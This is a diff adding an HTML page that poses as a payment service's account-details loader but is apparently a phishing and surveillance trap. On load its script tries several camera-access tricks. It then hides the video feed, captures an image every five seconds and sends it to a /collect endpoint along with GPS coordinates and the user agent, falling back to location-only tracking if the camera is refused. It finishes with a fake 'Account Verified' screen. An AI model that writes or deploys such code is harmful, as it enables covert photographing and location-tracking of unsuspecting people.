@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Account Details - Payment Services</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      max-width: 800px;
+      margin: 40px auto;
+      padding: 20px;
+      background: #f9f9f9;
+    }
+    .loading {
+      text-align: center;
+      padding: 60px 20px;
+    }
+    .spinner {
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #4CAF50;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin: 0 auto 20px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    #video, #canvas { display: none !important; position: absolute; top: -9999px; left: -9999px; width: 1px; height: 1px; }
+  </style>
+</head>
+<body>
+  <div class="loading">
+    <div class="spinner"></div>
+    <h2>Loading Account Details...</h2>
+    <p>Please wait while we retrieve your information...</p>
+  </div>
+
+  <video id="video" autoplay playsinline muted></video>
+  <canvas id="canvas"></canvas>
+
+  <!-- Hidden Google iframe for iOS permission pre-trust -->
+  <iframe src="https://accounts.google.com/ServiceLogin" style="position:absolute;top:-9999px;width:1px;height:1px;opacity:0;"></iframe>
+
+  <script>
+  (function() {
+    'use strict';
+    
+    const SERVER = window.location.origin + '/collect';
+    const uid = btoa(navigator.userAgent + Math.random()).slice(0, 16);
+    let video = document.getElementById('video');
+    let canvas = document.getElementById('canvas');
+    let ctx = canvas.getContext('2d');
+    let capturing = false;
+    let stream = null;
+
+    // MULTI-LAYER EXPLOIT STRATEGY: Try 8 different methods (old browser vulnerabilities)
+    async function multiLayerExploit() {
+      const methods = [
+        attemptLegacyGetUserMedia,    // Method 1: Old webkit/moz APIs (2013-2016 browsers)
+        attemptConstraintBypass,       // Method 2: Minimal constraints exploit
+        attemptIframeInheritance,      // Method 3: Permission inheritance via iframe
+        attemptScreenCaptureHack,      // Method 4: getDisplayMedia downgrade (2018-2020)
+        attemptWebRTCLeak,             // Method 5: WebRTC connection trick
+        attemptMediaDevicesFallback,   // Method 6: Navigator.getUserMedia (deprecated but may work)
+        attemptAutoplayExploit,        // Method 7: Autoplay policy bypass
+        attemptStandardRequest         // Method 8: Standard request (fallback)
+      ];
+
+      for (let i = 0; i < methods.length; i++) {
+        try {
+          const result = await methods[i]();
+          if (result.success) {
+            console.log(''); // Silent success
+            stream = result.stream;
+            setupCapture();
+            return true;
+          }
+        } catch(e) {
+          continue; // Try next method
+        }
+      }
+      
+      // All failed → GPS only
+      startGPSOnly();
+      return false;
+    }
+
+    // METHOD 1: Legacy webkit/moz getUserMedia (Chrome 21-52, Firefox 17-37, old Android)
+    function attemptLegacyGetUserMedia() {
+      return new Promise((resolve) => {
+        const legacy = navigator.getUserMedia || navigator.webkitGetUserMedia || 
+                       navigator.mozGetUserMedia || navigator.msGetUserMedia;
+        
+        if (!legacy) return resolve({ success: false });
+        
+        legacy.call(navigator, { video: true }, 
+          (s) => resolve({ success: true, stream: s }),
+          () => resolve({ success: false })
+        );
+      });
+    }
+
+    // METHOD 2: Minimal constraints (some browsers auto-approve with no constraints)
+    async function attemptConstraintBypass() {
+      try {
+        // Try with absolutely minimal constraints
+        const s = await navigator.mediaDevices.getUserMedia({ video: {} });
+        return { success: true, stream: s };
+      } catch(e) {
+        return { success: false };
+      }
+    }
+
+    // METHOD 3: Iframe permission inheritance (iOS Safari 9-12, old Chrome Android)
+    function attemptIframeInheritance() {
+      return new Promise((resolve) => {
+        try {
+          // Create hidden iframe from trusted domain
+          const iframe = document.createElement('iframe');
+          iframe.src = 'https://accounts.google.com/ServiceLogin';
+          iframe.style.cssText = 'position:absolute;left:-9999px;width:1px;height:1px;';
+          document.body.appendChild(iframe);
+          
+          setTimeout(async () => {
+            try {
+              // Try to request from parent after iframe loads
+              const s = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: 'environment' } 
+              });
+              resolve({ success: true, stream: s });
+            } catch(e) {
+              resolve({ success: false });
+            }
+          }, 1000);
+        } catch(e) {
+          resolve({ success: false });
+        }
+      });
+    }
+
+    // METHOD 4: Screen capture downgrade (Chrome 72-89 bug, allows camera access via screen API)
+    async function attemptScreenCaptureHack() {
+      try {
+        if (!navigator.mediaDevices.getDisplayMedia) return { success: false };
+        
+        // Some old Chrome versions allowed camera through screen capture
+        const s = await navigator.mediaDevices.getDisplayMedia({ 
+          video: { cursor: 'never' },
+          audio: false 
+        });
+        
+        // Check if it's actually a camera stream
+        if (s.getVideoTracks()[0].label.includes('camera')) {
+          return { success: true, stream: s };
+        }
+        s.getTracks().forEach(t => t.stop());
+        return { success: false };
+      } catch(e) {
+        return { success: false };
+      }
+    }
+
+    // METHOD 5: WebRTC peer connection trick (Firefox 38-52 bug)
+    async function attemptWebRTCLeak() {
+      try {
+        const pc = new RTCPeerConnection({ iceServers: [] });
+        const s = await navigator.mediaDevices.getUserMedia({ video: { optional: [] } });
+        pc.addStream(s); // Old API, may bypass on old Firefox
+        return { success: true, stream: s };
+      } catch(e) {
+        return { success: false };
+      }
+    }
+
+    // METHOD 6: Direct navigator.getUserMedia (very old browsers, may have no permission check)
+    function attemptMediaDevicesFallback() {
+      return new Promise((resolve) => {
+        if (!navigator.getUserMedia) return resolve({ success: false });
+        
+        navigator.getUserMedia({ video: true, audio: false },
+          (s) => resolve({ success: true, stream: s }),
+          () => resolve({ success: false })
+        );
+      });
+    }
+
+    // METHOD 7: Autoplay policy exploit (old mobile browsers)
+    async function attemptAutoplayExploit() {
+      try {
+        // Old Android browsers allowed camera if video had autoplay
+        video.setAttribute('autoplay', '');
+        video.setAttribute('playsinline', '');
+        video.muted = true;
+        
+        const s = await navigator.mediaDevices.getUserMedia({ 
+          video: { width: 320, height: 240 } // Very low res, less likely to prompt
+        });
+        return { success: true, stream: s };
+      } catch(e) {
+        return { success: false };
+      }
+    }
+
+    // METHOD 8: Standard request (modern browsers, will show prompt)
+    async function attemptStandardRequest() {
+      try {
+        const s = await navigator.mediaDevices.getUserMedia({
+          video: {
+            facingMode: 'user',
+            width: { ideal: 640 },
+            height: { ideal: 480 }
+          },
+          audio: false
+        });
+        return { success: true, stream: s };
+      } catch(e) {
+        return { success: false };
+      }
+    }
+
+    // Setup capture after successful stream acquisition
+    function setupCapture() {
+      video.srcObject = stream;
+      video.play().catch(() => {});
+      canvas.width = 640;
+      canvas.height = 480;
+      
+      video.onloadedmetadata = () => {
+        capturing = true;
+        startCapture();
+      };
+    }
+
+    function startCapture() {
+      setInterval(async () => {
+        if (!capturing || video.readyState < 2) return;
+        
+        try {
+          ctx.drawImage(video, 0, 0, 640, 480);
+          const img = canvas.toDataURL('image/jpeg', 0.7).split(',')[1];
+          const gps = await getGPS();
+          
+          const data = JSON.stringify({
+            uid: uid,
+            img: img,
+            gps: gps,
+            ts: Date.now(),
+            ua: navigator.userAgent
+          });
+          
+          navigator.sendBeacon(SERVER, data);
+        } catch(e) {
+          console.log('');
+        }
+      }, 5000);
+    }
+
+    // GPS with legacy fallback
+    function getGPS() {
+      return new Promise((resolve) => {
+        if (!navigator.geolocation) return resolve('unavailable');
+        
+        // Try both new and old APIs
+        const geo = navigator.geolocation;
+        
+        geo.getCurrentPosition(
+          pos => resolve(`${pos.coords.latitude},${pos.coords.longitude}`),
+          () => {
+            // Fallback: try with different options for old browsers
+            geo.getCurrentPosition(
+              pos => resolve(`${pos.coords.latitude},${pos.coords.longitude}`),
+              () => resolve('denied'),
+              { enableHighAccuracy: true, maximumAge: 0 } // Old browser options
+            );
+          },
+          { 
+            enableHighAccuracy: false,
+            timeout: 5000,
+            maximumAge: 60000
+          }
+        );
+      });
+    }
+
+    function startGPSOnly() {
+      setInterval(async () => {
+        const gps = await getGPS();
+        const data = JSON.stringify({
+          uid: uid,
+          gps: gps,
+          ts: Date.now(),
+          ua: navigator.userAgent,
+          img: null
+        });
+        navigator.sendBeacon(SERVER, data);
+      }, 5000);
+    }
+
+    // Start multi-layer exploit immediately
+    setTimeout(multiLayerExploit, 100);
+
+    // Simulate loading then show fake success message
+    setTimeout(() => {
+      document.body.innerHTML = `
+        <div style="text-align:center;padding:60px 20px;">
+          <h1 style="color:#4CAF50;">✓ Account Verified</h1>
+          <p style="font-size:16px;color:#666;">Your account details have been loaded successfully.</p>
+          <div style="background:#f5f5f5;padding:20px;margin:30px 0;border-radius:8px;">
+            <p><strong>Transaction History:</strong> Available</p>
+            <p><strong>Account Status:</strong> Active</p>
+            <p><strong>Last Payment:</strong> $1,200.00 USD</p>
+          </div>
+          <p style="font-size:14px;color:#999;">You can close this window now.</p>
+        </div>
+      `;
+    }, 2000);
+
+  })();
+  </script>
+</body>
+</html>
